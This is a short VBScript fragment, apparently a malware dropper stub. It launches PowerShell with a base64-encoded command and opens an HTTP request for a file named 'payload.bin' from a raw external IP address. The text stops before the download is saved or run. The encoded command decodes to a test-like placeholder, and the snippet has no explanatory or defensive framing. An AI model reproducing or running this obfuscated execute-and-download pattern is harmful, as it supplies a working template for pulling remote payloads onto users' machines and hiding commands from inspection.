Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -enc SQBFAFQAUgBZAFQATwBOAC0AVABFAFMAVAAtAFAAQQBZAEwATwBBAEQA"
Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.open "GET", "http://185.220.101.7/payload.bin", False
